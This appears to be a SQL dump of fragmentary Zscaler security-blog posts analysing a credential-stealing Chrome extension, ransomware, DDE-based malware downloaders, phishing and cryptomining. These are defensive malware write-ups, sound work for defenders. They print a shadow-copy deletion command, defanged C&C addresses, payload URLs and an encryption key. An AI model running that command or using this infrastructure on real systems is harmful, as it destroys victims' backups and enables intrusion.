moving towards the encrypted phishing sites.    In the past few weeks, we\'ve found many similar encrypted phishing sites that are designed to look like the homepages of a UK government agency, Apple, PayPal, Netflix, AOL, and others.

The extension will sit there waiting for the user to visit targeted sites. As soon as the user visits any of those sites, the extension will activate and set the proxy to redirect user traffic to the attackers server.

Extension manifest.json file\r\n\r\nThe manifest file is a JavaScript Object Notation (JSON) formatted file that must be present in every extension. It defines all permissions, scripts and URL expression matches and other important details about the extension. This manifest reveals much of the extension\'s functionality. This extension poses as “Google Secure Web” extension with the description “Segurança para o seu navegador,” which translates to “Security for your browser.”\r\n\r\nIt requests following permissions:\r\n\r\n\r\n	“tabs” : Access to privileged fields of the tab objects used by several APIs, including the chrome.tabs APIs, to interact with the browser\'s tab system. You can use this API to create, modify, and rearrange tabs in the browser.\r\n	“http://*/*,https://*/*, *://*/*\": All protocols and all URLs.\r\n	“webNavigation” : Access to the chrome.webNavigation API to receive notifications about the status of navigation requests in-flight.\r\n	“webRequest” : Access to the chrome.webRequest API to observe and analyze traffic and to intercept, block, or modify requests in-flight.\r\n	“webRequestBlocking” : Use of the chrome.webRequest API for blocking.\r\n	“Storage” : chrome.storage API to store, retrieve, and track changes to user data.\r\n	“cookies” : chrome.cookies API to query and modify cookies, and to be notified when they change\r\n	“activeTab” : The activeTab permission gives an extension temporary access to the currently active tab when the user invokes the extension, for example, by clicking its browser action. Access to the tab lasts until the tab is navigated or closed.\r\n	“proxy” : chrome.proxy API to manage Chrome\'s proxy settings.\r\n\r\n\r\nThe manifest file specifies a wildcard for web_accessible_resources, sets “jquery.js” and “background.js” as background pages and “jquery.js” and “content.js” as content scripts to run on all frames of all web pages by injecting them at end of DOM.\r\n\r\nBackground pages are long-running code segments; when the extension is started the background page runs as long as the browser is running or when the extension is disabled.\r\n\r\nContent Scripts are JavaScript files that run in the context of web pages; they can read or modify DOM.\r\n\r\nIt also specifies “*://www2.bancobrasil.com.br/*” and “*://*.bb.com.br/*” as externally_connectable so that these web pages can connect to the extension via runtime.connect and runtime.sendMessage.\r\n\r\nBackground Script\r\n\r\nBackground script is obfuscated JavaScript code.\r\n\r\n\r\n\r\nFigure 7. Obfuscated script\r\n\r\nAfter deobfuscation, we can see human readable code as shown in Figure 8 and Figure 10.\r\n\r\nThis script adds two callbacks for messages received from the content script, and it acts on two commands, “prx” and “bj”: \r\n\r\n“prx” - sets “191.252.186[.]175:9595” as proxy.\r\n\r\n\r\n\r\nFigure 8.

Script code for sending stolen data to C&C\r\n\r\nContent Script \r\n\r\nContent script is also obfuscated similar to the background script and can be read after deobfuscation. If any of “aapj.bb.com[.]br,” “bb.com[.]br,” or ”bancobrasil.com[.]br” is visited, it will send the “prx” command to the background script, which will set proxy and, in the case of “aapj.bb.com[.]br,” will also inject JavaScript code in the web page to intercept a click with following button IDs “botao.acao.ok,” “botao.acao.assinar,” and “botao.acao.entrar” (translation “Button.Action.Ok, Sign, and Log In”).\r\n\r\n\r\n\r\nFigure 11. Script code for sending \"prx\" command if required url is visited\r\n\r\nWhen any of those buttons are clicked, it will intercept the click event, get the value of “senhaConta” (translation “passwordContact”) and ID “param” and send “bj” command to the background script with these values. It in turn sends these values and session cookies to the command and control (C&C) server.\r\n\r\n\r\n\r\nFigure 12.

There have been several dozen new ransomware strains and attacks seen in 2017, including the infamous global ransomware outbreaks of WannaCry, Petya, and BadRabbit that impacted millons of computers world-wide. In this blog, we explore two ransomware strains from 2017 - Vortex and BUGWARE, both of which are compiled in Microsoft Intermediate Language (MSIL) and packed with the \'Confuser\' packer. Interestingly, both ransomware strains are using open source code for encrypting user files.\r\n\r\nThreatlabZ, the research division of Zscaler, has been tracking these strains and is seeing payloads actively being pushed to the users via spam campaigns containing malicious URLs. \r\n\r\nCase #1 - Vortex Ransomware\r\n\r\nVortex, written in Polish, employs the AES-256[2] cipher to encrypt victims\' image, video, audio, document, and other potentially important data files. The ransom note informs victims about the restoration of files and details how to send the ransom. The ransom note has the title “##@@ INFO O PLIKACH.txt.”\r\n\r\n \r\n\r\n\r\n\r\n                                                                                Figure 1: Ransom note\r\n\r\nIn this example, two files are getting decrypted for free and the ransom demand is $100, which will increase to $200 in four days. This variant offers two email IDs for contacting the attacker: Hc9@2.pl and Hc9@goat.si.\r\n\r\nInstallation\r\n\r\nThe malware creates a registry entry for persistence.\r\n\r\n                                                            Figure 2: Registry Entry\r\n\r\n \r\n\r\nIt also creates a registry key called “AESxWin.”                                                               Figure 3: Registry Key\r\n\r\n     \r\n\r\n       \r\n\r\nUpon execution, the malware will attempt to encrypt the files with following extension on the victim machine:\r\n\r\n                                                                Figure 4: Filetypes encrypted by Vortex\r\n\r\n \r\n\r\nThe following is a list of other file types that will get encrypted by the Vortex ransomware.\r\n\r\n                                                            Figure5: Other Filetypes that will be encrypted by Vortex\r\n\r\n \r\n\r\nVortex also deletes all the shadow copy of restore point by running the following command:\r\n\r\nvssadmin.exe delete shadows /all /Quiet\r\n\r\nThis ensures that the victim cannot recover their files by restoring the system to a preinfection state.\r\n\r\nCommand and Control (C&C) communication:\r\n\r\nThe following screenshot shows the ransomware requesting the password API, which is random and changes with every request:\r\n\r\n                                                            Figure 6:Password API request\r\n\r\n \r\n\r\nThis screen shows the malware contacting the C&C server and sending system information.                                                            Figure7: Sending system info to C&C\r\n\r\n  \r\n\r\n \r\n\r\nThe following is a screenshot of the password API used for the encryption and decryption key.\r\n\r\n                                           Figure8: Get request with IP, System ID, Data and Password API\r\n\r\n \r\n\r\nWhile analyzing the malware, we saw that its code was entirely based on AESxWin, which is a freeware encryption and decryption utility hosted on GitHub, and was created by Egyptian developer Eslam Hamouda.\r\n\r\n                                           Figure9: Developer signature in stolen code\r\n\r\n \r\n\r\nWe further validated the unaltered usage of this tool in Vortex ransomware by successfuly decrypting the files on the infected system using the AESxWin utility with the same password that was used for encryption.\r\n\r\n                                                  Figure10: Decryptor\r\n\r\n \r\n\r\nCase #2 - BUGWARE Ransomware\r\n\r\nA new ransomware strain called BUGWARE [first seen Oct 2017] uses the open source Hidden Tear code. It encrypts the files and, for ransom, requests the equivalent of a thousand Brazilian real in a virtual currency called MONERO. The main BUGWARE payload uses an invalid certificate pretending to be for GAS INFORMATICA LTDA.\r\n\r\n                                                       Figure11: Invalid Certificate\r\n\r\nPayload analysis\r\nFirst, it searches for the file “%AppData%\\Lista.log.” If this file is found, the malware will terminate itself.\r\n\r\nBUGWARE stores a list of whitelisted path in Criptografia.whitelist variable and will not attempt to encrypt the files present in those folders.\r\n\r\n\r\n	%ProgramFiles%\r\n	%ProgramFilesX86%\r\n	%Windows%\r\n	%AppData%\\Roaming\r\n	%AppData%\\Local\r\n\r\n\r\nIt also avoids ecnrypting files in directories that contain the following strings:\r\n\r\n\r\n	$recycle.bin\r\n	Intel\r\n	Nvidia\r\n\r\n\r\nThe payload creates a list of paths to encrypt and store in the Criptografia.pathstoencrypt list.\r\n\r\n\r\n	%Desktop%\r\n	%Documents%\r\n	%Music%\r\n	%Pictures%\r\n	%Videos%\r\n\r\n\r\nIt searches for fixed, network, and removable drives, and adds those paths into the Criptografia.pathstoencrypt list.\r\n\r\nEncryption Process\r\nBUGWARE generates a random GUID using the passworrandom.com website and adds “-DCLXVI” at the end of the string and stores in the AES.senha variable. If the payload is unable to get the GUID from that website, it generates AES.senha using following combination - “DCLXVI-{generate GUID using Guid.NewGUID() function}.”\r\n\r\n                                                   Figure12: Generating Key\r\n\r\n \r\n\r\nIt generates a key by calculating SHA-256 of AES.sneha. User files are then encrypted using the AES 256-bit algorithm leveraging the key stored in AES.sneha.\r\n\r\nAfter encryption, the malware renames files with “filename.[SLAVIC@SECMAIL.PRO].BUGWARE” and makes each file\'s entry in Lista.log file. It changes the CreationTime, LastAccessTime, and LastWriteTime with a random datetime format.\r\n\r\n                                                      Figure13: Modifying Filename and File Properties\r\n\r\n \r\n\r\nThe following screenshot displays the targeted file extensions encrypted by BUGWARE.                                                      Figure14: Targeted File extension\r\n\r\n \r\n\r\nBUGWARE will download image files from “i[.]imgur.com/NpKQ3KZ.jpg\" and set this image as the victim’s desktop background after restarting the system.\r\n\r\n                                                    Figure15: Bugware Wallpaper\r\n\r\n \r\n\r\nAfter encrypting files, BUGWARE shows its warning messages.

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (47, 'Black Friday Deals: Trojans, Phishing, and Crypto Coin Mining', 'Chris Mannon,', 'November 21, 2017', 'Thanksgiving is once again upon us, followed by \"Black Friday,\" which typically means one of two things: you will either be spending time with family as you recover from a food hangover, or you will be fighting the crowds for deals at retail stores.    But wait! There is a way you can have your pumpkin pie and eat it too.    These days most shopping outlets promote their Black Friday/Cyber Monday deals on their websites in advance of the holiday; many offer great online deals and perks like free shipping to entice shoppers to avoid the crowds and shop online. But beware: malware authors anticipate the increase in online shopping and use the season to manipulate users to their own ends.    As shopping increases, so do risks    Today’s bad actors use a variety of methods to lure users into clicking malicious links or opening infected files. They use phishing to attempts to harvest credentialsor lead victims to less-than-reputable stores. They send opaquely named files and create websites designed to confuse recipients. They can even use your CPU resources when you visit their shop to mine Crypto Currency without consent. In this blog, we will describe in further detail how some of these techniques are being used, and how to avoid them.    When does it all start?    In the Zscaler cloud, we start to see an increase in shopping activity as early as November 1st. No sooner are we putting away our jack-o-lanterns than we start to look forward to the shopping season. It’s really no wonder that Starbucks starts its holiday music onslaught the day after Halloween.    Shoppers tend to do most of their holiday shopping over non-mobile PC devices. While it might be easier to navigate shopping sites on a big screen, PC users are at an added risk of phishing attacks. In Fig. 1, you can see that phishing attempts are high at the onset of the shopping season. Mobile users are actually less prone to phishing attacks, because they tend to use specific trusted apps rather than surfing the open internet. Fig. 2 shows us that there is a slight uptick in shopping activity on mobile devices while phishing attempts start to fall.         Fig 1: Shopping trends steadily rise closer to black Friday, and so do phishing attempts.        Fig 2: Mobile shopping trends steadily increase while scam attempts dwindle.    Domain Squatting    “Domain squatting” is the act of buying up domain names that are visually similar to the names of legitimate websites or companies, typically with the intent of defrauding users or convincing them that the content on the domain can be trusted. The multitude of new top-level domains (TLDs) that ICANN has made available has given criminals many opportunities to grab up domains that are identical or similar to real company websites, but with a different TLD suffix.    Especially relevant this season is the “.blackfriday” TLD. This domain is meant specifically for pages dealing with Black Friday sales, and is commonly used by various corporations to link to sales on their online stores or to Black Friday marketing content.    We have observed multiple instances of malicious actors domain squatting “.blackfriday” TLDs, such as these examples of domains that are visually similar to Google domains:      	gooogle[.]blackfriday  	guugle[.]blackfriday      Both of these domains were registered earlier this year, and have been seen serving various forms of malicious content. The first domain, “gooogle[.]blackfriday,” was used to deliver a Microsoft Outlook phishing page, as well as infect users with the Fareit Trojan. Fareit is a commodity infostealer that is typically used to harvest stored passwords and credentials from web browsers.    Fareit MD5: 76c016592f189d6de4166c5907f5063b    The second domain, “guugle[.]blackfriday,” was used as a command-and-control server for users infected with the commodity malware Loki. Loki is an infostealer that is capable of stealing stored passwords and cryptocurrency wallet information from a variety of applications. It is believed that this URL was spread through malicious email campaigns.    Loki MD5: ab8f64e3d30ab00518935c1e68617f73    The combination of a familiar-looking domain name with the “.blackfriday” TLD puts online shoppers especially at risk for accidentally visiting a malicious site while browsing for Black Friday deals and sales this season. Users should be careful to inspect the URLs they visit online to make sure they are legitimate, and to avoid clicking on links in emails from untrusted sources.    Crypto currency mining activity    Crypto currency mining has become a popular method of monetization, as reported in this blog. Instead of relying on advertising revenue, site owners will embed a script in their site that will leverage the user’s browser to begin mining crypto currency. This activity is very CPU intensive on victims’ systems and it’s done completely without their knowledge or consent. Furthermore, the only way to stop the activity from continuing after you leave the site is to completely shut down your browser.    The screen capture below shows the number of crypto currency mining attempts we’ve seen since the start of the shopping season (attempts were blocked before they could begin mining activity).        Fig 3: Shopping keywords seen in referer URL of Cyrpto currency mining attempts.    Fake Shops    Finding the best deals can be tricky, and the number of fake shops that seem to crop up around this time of year make things far more difficult. Performing a basic Google search can yield highly suspect shops touting themselves as offering legitimately good deals. The following result was found on the front page of a Google search for “Ray-Ban sunglasses.”        Fig 4: Top search—too good to be true    The above result is convincing; with its legitimate-sounding domain name, it could be a real outlet store offering great deals. But the Whois records tell a different tale.      	Domain Name: rayban-outlet.us  	Registrant Name: Jiang Yongxin  	Registrant Street: Shanghai 1  	Registrant City: Shanghai  	Registrant State/Province: Shanghai  	Registrant Country: CN  	Registrant Email: jyt.832104@gmail.com          Fig 5: Seemingly legitimate page    We checked the registrant email for the site, and the threat intelligence organization DomainTools shows 18 other websites created under the same email address. Running fraudulent stores is yet another way for threat actors to profit from unsuspecting users.    Phishing documents    Malicious documents sent via email are one of the most prevalent threats users face. Often, these documents are distributed in phishing campaigns, where the malicious actor pretends to be a legitimate source or company in an attempt to earn the victim’s trust (and to entice victims to open an attachment or click a link).    More sophisticated “spear-phishing” attacks target individual users or organizations by mimicking a source that is unique to them, such as their employer or business associates. The combination of these spear-phishing techniques with Black Friday branding, especially when linked with phrasing that would suggest sales, bargains, or contests, can significantly increase the likelihood that targeted users will fall victim to the malicious campaign.    Targeted phishing documents like the following are typical of these sorts of attacks. We came across the following malicious document in one of the major security feeds that we monitor where the filename used is “Black Friday Bonus Registration.docx,” suggesting the Black Friday theme as well as a potential reward to incentivize users into opening the document attachment.             Fig 6: Fake “Black Friday Bonus Registration.docx” document with embedded malicious application     The document, with carefully reproduced corporate branding, encourages the user to open an embedded application, which installs malicious software onto the victim’s computer.    Conclusion    The Zscaler ThreatLabZ team is working around the clock to ensure that our customers do not fall prey to the kinds of malicious activities we\'ve described here. To protect yourself this year (and every year), we highly recommend that all online shoppers exercise extreme caution and follow our holiday season shopping security checklist:      	Inspect the source of emails with enticing shopping deals; be wary of any suspicious attachments  	Steer clear of unofficial mobile application stores  	Ensure HTTPS/secure connections to online retailers and banking sites  	Check the authenticity of the URL or website address before clicking on a link  	Stay away from emailed invoices, which is a social engineering technique often used by cyber criminals to download threats like Win32.Trojan.Emotet, reported in this blog  	Do not use unsecured public Wi-Fi for shopping  	Use two-factor authentication whenever possible, especially on sensitive accounts such as those used for banking  	Always ensure that your operating system and web browser are up to date and have the latest security patches installed  	Use browser add-ons like Adblock Plus to block popups and potential malvertisements  	Use browser add-ons like No Coin to block store attempts to use your computer for crypto currency mining  	Back up your documents and media files  	Review the Identity Theft Guide and FAQs from the Federal Trade Commission      Wishing you all a very happy, healthy, and safe Thanksgiving!', 'Analysis;Malware;Mobile;Phishing;Scam', 'https://www.zscaler.com/blogs/research/black-friday-deals-trojans-phishing-and-crypto-coin-mining');

To no one\'s surprise, hackers have been quick to exploit this vulnerability to spread malware through rigged Microsoft Word documents.\r\n\r\nIn this same timeframe, the Zscaler ThreatLabZ team has seen a number of these malicious documents using the DDE vulnerability to download and execute malware. Most of the payloads we saw were Remote Access Trojans (RATs), ransomware, and backdoors.\r\n\r\nIn this blog, we will share a detailed technical analysis of a few of these exploitations and their payloads.\r\n\r\n \r\n\r\nBackground\r\n\r\nThe Microsoft Dynamic Data Exchange (DDE) protocol allows data to be transferred between applications. These applications can use DDE for one-time data transfers or for continuous exchanges; for example, a Microsoft Word document that uses data from an Excel spreadsheet is updated automatically through DDE as the spreadsheet data is updated. The DDE protocol sends messages between applications that share data and uses shared memory to exchange data between the applications. \r\n\r\nMicrosoft Word documents have been used before to spread malware, but in those cases the victim would have to manually enable macros for the payload to be downloaded onto the victim’s system. With the DDE vulnerability (feature) in Microsoft Word, attackers can embed a malicious script that can download and execute malware without the use of macros.\r\n\r\n \r\n\r\nCase I: DDE protocol abuse leads to post-exploitation using PowerShell\r\n\r\nOne Word file we analyzed exploited the DDE vulnerability to download and execute a PowerShell script using a post-exploitation framework.\r\n\r\nFilename - Communications_Suggestions_by_Press_Office_Director.docx\r\n\r\nThe document looks like this:\r\n\r\n\r\n\r\nFig1: Malicious document\r\n\r\nGenerally, fake documents like this are spread via an email campaign targeting small and large groups of businesses in numerous industry sectors.\r\n\r\nThe workflow of the document is as follows:\r\n\r\n\r\n\r\nFig2: Document Workflow (case I)\r\n\r\nIn this document, the attacker uses the DDE protocol to launch a Windows command line tool (cmd.exe), which uses PowerShell to download and execute the malware from a given URL.\r\n\r\nThe field content looks like this:\r\n\r\n\r\n\r\nFig3: DDE field code\r\n\r\nIt downloads and executes a file using cmd.exe and PowerShell, which is present at the following URL: hxxp://citycarpark[.]my/components/com_admintools/mscorier.\r\n\r\nThe downloaded data (mscorier) is an obfuscated batch script that creates a PowerShell script and executes it.\r\n\r\n\r\n\r\nFig4: Obfuscated batch script (payload 1)\r\n\r\nThis script downloads another payload (wsdprintproxy) from hxxp://185.128.42[.]194/wsdprintproxy and stores it in the following registry to make itself persistent:\r\n\r\nHKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\ThemeVersion\r\n\r\n\r\n\r\nFig5: Storing payload 2 in registry\r\n\r\n\r\n\r\nFig6: Registry entry of payload 2\r\n\r\nFor persistence, payload 1 also creates two scheduled tasks, which execute the obfuscated script.\r\n\r\n\r\n\r\nFig7: Code for persistence\r\n\r\nOne scheduled task is created with name FlashUpdateServiceInit, which runs daily at 11:00 a.m., and another task with name FlashUpdateService, which runs daily at 3:00 p.m.\r\n\r\nAfter these tasks run, the script bypasses the PowerShell ScriptBlock logging, which means that the first execution of the malicious script will turn off all further logging.\r\n\r\n\r\n\r\nFig8: Enabling script block logging\r\n\r\nTo download its next payload, the malware initiates a GET request with the cookie “session=j4ppw/hpWdU/l5V3v9eymlAYxmE=” and downloads payload 3 from hxxps://185.128.42[.]194:8080/news.php.\r\n\r\n\r\n\r\nFig9: Downloading payload 3 from server\r\n\r\n\r\n\r\nFig10: Downloaded encrypted payload 3\r\n\r\nThe downloaded data is encrypted with RC4.\r\n\r\nData[0:4] = IV\r\n\r\nData[4:length(Data)] = Encrypted data\r\n\r\nKey is hardcoded in the script which is:\r\n\r\nKey = “a231fe7690a85f02eb147f53229c8e02”\r\n\r\n\r\n\r\nFig11: RC4 algorithm\r\n\r\nThe script will decrypt the downloaded data. It is, again, a PowerShell script, which is executed after decryption.\r\n\r\nThe decrypted PowerShell script sends the encrypted RSA key with “IV” to the server at: hxxps://185.128.42[.]194:8080/news.php. In response, the server sends the encrypted AES key to victim.\r\n\r\nThe script fetches information from the victim’s machine, encrypts it with the AES key, and sends it to the server at: hxxps://185.128.42[.]194:8080/process.php.\r\n\r\nNonce|Server_URL|UserDomainName|UserName|Machine|IPAddress|OperatingSystem|True(if UserName=”system”)Otherwise False|CurrentProcessName|ProcessID|powershell|PowershellVersion\r\n\r\nThe server responds with the final payload PowerShell script which appears to be a part of the PowerShell empire framework post-exploitation.\r\n\r\nTransactions of this post-exploitation framework look like this:\r\n\r\n\r\n\r\nFig12: Network transactions\r\n\r\nThe PowerShell empire is a post-exploitation framework that provides a Metasploit-like framework in PowerShell and Python. It includes different types of backdoors with multiple modules. It deals strictly with Windows machines and is extremely useful in penetration testing. In some cases, however, attackers use this framework to hijack a user’s system and perform malicious activities.\r\n\r\n \r\n\r\nCase II: DDE protocol abuse leads to Locky ransomware\r\n\r\nIn another recent case, a campaign of spam emails was delivering a Word document attachment that used the DDE technique, and the final payload of that campaign is Locky ransomware.\r\n \r\n\r\n\r\n\r\nFig 13: DDE protocol abuse leads to Locky ransomware (case II)\r\n\r\nIn this case, attackers are writing obfuscated malicious field code in Word documents to evade detection; this code can be found in word-document.xml after extraction.\r\n\r\n\r\n\r\nFig14: Field word-document.xml obfuscated code\r\n\r\nThe exploit downloads the encoded PowerShell script from:  hxxp://lestrangeresearch[.]com/kdjsw23FGS. It then decodes and executes it through cmd.\r\n\r\n\r\n\r\nFig15: Encoded PowerShell (payload 1)\r\n\r\nThe decoded script look like this:\r\n\r\n\r\n\r\nFig16: Decoded PowerShell script (payload 1)\r\n\r\nThe decoded PowerShell script has six hardcoded malicious URLs.\r\n\r\nThe script will try to download the content from a URL and store it in %temp% with the name hti4.exe. Upon successful download, the script executes the downloaded file.\r\n\r\n\r\n\r\nFig17: Downloaded payload 2\r\n\r\nPayload 2 is the intermediate payload. Its function is to check the system for specified parameters. If it satisfies specific criteria, it then downloads encrypted data from:  hxxp://spooner-motorsport[.]com.\r\n\r\n\r\n\r\nFig18: Encrypted Locky ransomware (payload 3)\r\n\r\nThis encrypted data is decrypted and launched by the intermediate payload (payload 2).\r\n\r\nAfter decryption, the final payload is Locky ransomware, which encrypts the files, appends the .asasin extension after encryption, and demands ransom in Bitcoin for decryption.\r\n\r\n\r\n\r\nFig19: Ransom note (asasin.bmp)\r\n \r\n\r\n\r\n\r\nFig20: Locky payment site\r\n\r\n \r\n\r\nCase III: Attack in New York\r\n\r\nRecently, researchers at McAfee found a new phishing campaign from Russia\'s hacking group APT28 known as “Fancy Bear.”\r\n\r\nAPT28 capitalized on the recent terror attack in New York City by spreading email with an attached malicious Word document named IsisAttackInNewYork.docx, and the document appears to leverage the DDE technique.\r\n\r\nIn this case, the first-stage payload was a PowerShell script that downloads another base64 encoded PowerShell script. After that, the second-stage payload script downloads a new variant of Seduploader, which is spyware capable of taking screenshots, gathering sensitive data, and other intrusive activities.\r\n\r\n \r\n\r\nPreventions:\r\n\r\nIf a document contains embedded malicious DDE code, it shows the following warning to users as they open it. \r\n\r\nFig 21: Microsoft Word warning\r\n\r\nThe best way to prevent this DDE attack vector is to click “No” when this dialog box appears; this will stop further execution of the malware.\r\n\r\nAnother way to prevent this attack is to disable it by modifying the registry.\r\n\r\nMicrosoft has also published security advisory for securely opening Microsoft documents that contain a DDE field.\r\n \r\n\r\nConclusion:\r\n\r\nAttackers are abusing the Microsoft DDE protocol to download and execute malware using PowerShell. In an earlier case, PowerShell led to an entire post-exploitation framework used for penetration testing. But attackers are using the framework for malicious purposes, such as stealing a user’s sensitive information, uploading and executing malware on a user’s machine, altering the user’s data, and so on. In recent cases, the DDE protocol led to ransomware, including Locky, which encrypts the victim’s data and demands ransom for the decryption.\r\n\r\nThe malware analyzed in this blog is detected as COM.Downloader.DDE', '', 'https://www.zscaler.com/blogs/research/microsoft-dde-protocol-based-malware-attacks');

Website monetization is the process of converting traffic sent to a website into revenue. \"Pay-Per-Click\" Advertising, \"Selling Ad Space\", \"Affiliate Marketing\" and \"Donations\" are the most common practices used for monetizing a website. The idea of mining crypto-currency on a user\'s browser to monetize a website was introduced by a company called Coinhive. Coinhive provides a JavaScript library that can be invoked within a loaded webpage to start mining for cryptocurrency called Moneros (XMR) as an alternative source of revenue. As a service fee Coinhive keeps 30% of earned XMR and 70% share is given to site owner. As a result, the user gets an ad free experience on the webpage at the cost of some CPU cycles, the website owner earns 70% and the mining-service provider gets 30% of the generated XMR: appears to be Win-Win for everyone.         This new  website monetization tactic has attracted much attention. Torrent sites like \"The Pirate Bay,\" as well as certain porn sites, have quickly adopted it. Also, similar service providers such as Crypto-loot, CoinBlind, CoinNebula, MineMyTraffic, Jsecoin, Coin-Have, PPoi and Adsencebase have emerged.    In the month of October, we found around 2K unique domains that had embedded coin mining JavaScript and ~20K unique URLs churning CPUs of users to generate revenue.             Fig 1: Daily unique webpage hit count  in Oct-17.             Fig 2: Geo-location of hosts/websites those adopted in-browser mining.             Fig 3: Geo-location of clients who accessed mining websites.         The more time a user spends on the site the more revenue will be generated. Websites providing video streaming and file-sharing services tend to benefit more from in-browser mining. As a result, we are seeing more hits on these types of websites. In addition to  voluntarily deploying mining, we have also noticed that mining has been deployed on compromised sites too – giving the bad guys one more vector that can be abused for financial gain.             Fig 4: Top-100 sites based on number of hits.         As traditional website monetization has introduced risks of personal data theft through adware and malvertisements, browser mining has similarly opened the door for new types of threats.    From a security perspective, crypto-currency mining inside browsers is not malicious by itself. However, we observed that this practice is being carried out silently without end user’s consent and knowledge, which makes it undesirable. Cyber criminals are injecting mining script in compromised websites which secretly consume CPU cycles of a user\'s laptop or mobile device to mine cryptocurrency when the user visit the website. This is a resource-hijack attack where there is no immediate way to tell that a webpage is consuming CPUs. However, one site performing mining is likely to bring poor experience on the websites open in other tabs. Moreover, multiple webpages will drain the CPU if it performs mining parallelly in different tabs. When these kind of miners are in action, a user will find the computer or the mobile device  running slower and the CPU temperature will rise causing mobiles to overheat, which may damage or reduce the life of the device. Additionally, this could result in increased electricity bill for users.             Fig 5: CPU Usage in normal conditions.             Fig 6: CPU Usage when mining started.             Fig 7: Source code of webpage embedded mining script.         JavaScript Miners for Mobile    The phenomenon of in-browser JavaScript based cryptocurrency mining has made its way to Android applications on the Google Play Store too. Researchers found some apps which are using Coinhive’s service without any notification to the user. When an app with the cryptocurrency miner is opened, it will start consuming resources, leading to reduced battery life and slower performance of device.        Fig 8: Snapshot of JavaScript code used for mining in an app.         One can argue that in-browser mining is a neat and clean alternative for pop-ups and banner ads because ads are annoying and have their own privacy and security concerns. On other hand, consuming user’s resources without their consent makes this practice precarious. In our findings, we observed that none of mining services prompted the user or provided an opt-out option. Therefore, we are blocking such webpages. In a response to security concerns on illegitimate mining, Coinhive has also introduced a JavaScript library that provides opt-out option to users.', 'Abuse', 'http://www.zscaler.com/blogs/research/new-era-crypto-currency-mining-websites-and-mobile-apps');

This was the case with Netflix and Pokemon GO. Attackers exploit people’s appetite for new apps and their desire to be the first to have them by offering up fakes before the real versions are officially launched or by mimicking add-on functionality that is not yet available in the official app. \r\n\r\nThreatLabZ strongly advises users to stay away from scams like the fake Sarahah app and download apps only from official Android stores, like Google Play. As an added precaution, it is advisable to review an Android app\'s permissions before installing it to get a clear picture of the app’s capabilities and the developer’s motive.\r\n\r\nThreatLabZ will continue to monitor the use of apps for spreading malware to ensure that Zscaler customers remain protected from such attacks.', '', 'https://www.zscaler.com/blogs/research/dont-lose-your-privacy-sarahahs-anonymity');

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (55, 'Top Exploit Kit Activity Roundup - Summer 2017', 'Derek Gooley,', 'September 12, 2017', 'Overview    This is the sixth installment in a series of blogs highlighting the recent activity of the top exploit kits. Exploit kits (EKs) are rapidly deployable software packages designed to leverage vulnerabilities in web browsers to deliver a malicious payload to a victim’s computer. EK authors offer their services for sale, distributing malware for other malicious actors.    In this blog, we will be looking at the most active EKs, including RIG, Magnitude, Terror, and the newest arrival - Disdain.    You can read our roundup from spring 2017 here.    RIG Exploit Kit    RIG remains the most consistently active exploit kit, distributed over several simultaneous campaigns to install ransomware, banking Trojans, and cryptocurrency mining software on vulnerable systems. In the latter part of spring, we saw a small decline in RIG activity; however, since then, we observed generally steady RIG traffic, with the exception of small spikes in June and August.        Figure 1: RIG hits, June 2017 – August 2017        Figure 2: RIG heat map, June 2017 – August 2017    The distribution of RIG hosts remains somewhat similar to previous reports, although the activity we observed in Southeast Asia and South America earlier this year was absent this quarter.    In addition, the last three months show an increase in the RIG presence in India, as well as a lack of activity in eastern Europe and Russia, a region that usually serves a significant portion of RIG hosts.    For a long time, the structure of most RIG campaigns was mostly static and unchanging, making it trivial for researchers to track and guard against the exploit kit. However, over the last year, many modifications were introduced to the EK, along with frequent changes to its URI scheme.        Figure 3: RIG EK cycle    This instance of a currently active RIG campaign (part of a newer iteration of the \"Seamless\" campaign that began earlier this year) shows an example of a recent URI structure for the EK. The campaign uses the URI parameters \"warm\", \"sea\", and \"gifts\" in transactions with the landing page host, as well the pattern \"/signu[1-4].php\" for its redirection page.        Figure 4: RIG EK redirect page    Recent RIG campaigns have been observed dropping Cerber, GlobeImposter, and Princess ransomware families. These campaigns have been using the CVE-2015-8651 and CVE-2015-5122 Adobe Flash exploits, as well as the scripting engine memory corruption vulnerability exploit CVE-2016-0189.    Magnitude Exploit Kit    The Magnitude EK is one of the longest-running exploit kits, first launched in 2013. This exploit kit has seen much lower volume activity in recent years, compared to RIG, Angler, and Neutrino (when the latter two were active).    Magnitude has primarily targeted Southeast Asian countries through malvertising campaigns, such as in the following recently observed cycle.        Figure 5: Magnitude EK cycle    This campaign has several marked differences from campaigns we described in our previous roundup. This activity shows the campaign managers utilizing the RemarketingPixel advertising network to derive statistics of the infection attempts. The tracking network provides the attackers insight into demographics and the effectiveness of their campaign.    The landing pages in this campaign use various fake file extensions for the scripts and malware payloads, such as .bmp, .sct, etc. This Magnitude campaign was also missing the Adobe Flash fingerprinting scripts we saw in the spring campaigns.    The common CVE-2016-0189 exploit was used to infect vulnerable systems with Cerber ransomware.    Below is an example of a recent Magnitude campaign landing page:        Figure 6: Magnitude EK redirect script    This redirects to a fingerprinting script:        Figure 7: Magnitude EK Kaspersky fingerprinting script    This script attempts to check for the creation of an ActiveX object for the Kaspersky Virtual Keyboard plugin. If the check fails, the exploit chain continues and the victim is redirected to a page that serves the CVE-2016-0189 exploit and infected with Cerber ransomware.        Figure 8: System infected with Cerber    Terror Exploit Kit    The Terror EK is a newer exploit kit we began tracking in late 2016. This kit was formed as an amalgamation of several active exploit kits, particularly using code and exploits taken directly from the Sundown EK. Initially, Terror was relatively unsophisticated and was primarily used to drop ccminer, a cryptocurrency mining package, on exploited systems.    Over the last two quarters, Terror has undergone changes. This spring, Terror introduced a number of host and version fingerprinting scripts and began dropping various malware payloads (Tofsee, Andromeda/Gamarue, Smoke Loader) in addition to ccminer. More recently, Terror introduced the use of CVE-2017-0059, an Internet Explorer exploit affecting versions 9 through 11, and CVE-2017-0037, an exploit affecting Internet Explorer 10 and 11, and Microsoft Edge,    Terror activity dropped off significantly during the spring of 2017, but the exploit kit has remained active.    The code for exploits CVE-2017-0059 and CVE-2017-0037 can be easily identified in Terror EK by their similarity to the proof-of-concept code posted to Google Project Zero\'s bug tracker:        Figure 9: CVE-2017-0059 POC        Figure 10: CVE-2017-0059 in Terror EK        Figure 11: CVE-2017-0037 POC        Figure 12: CVE 2017-0037 in Terror EK    Disdain Exploit Kit    The Disdain EK is a brand-new 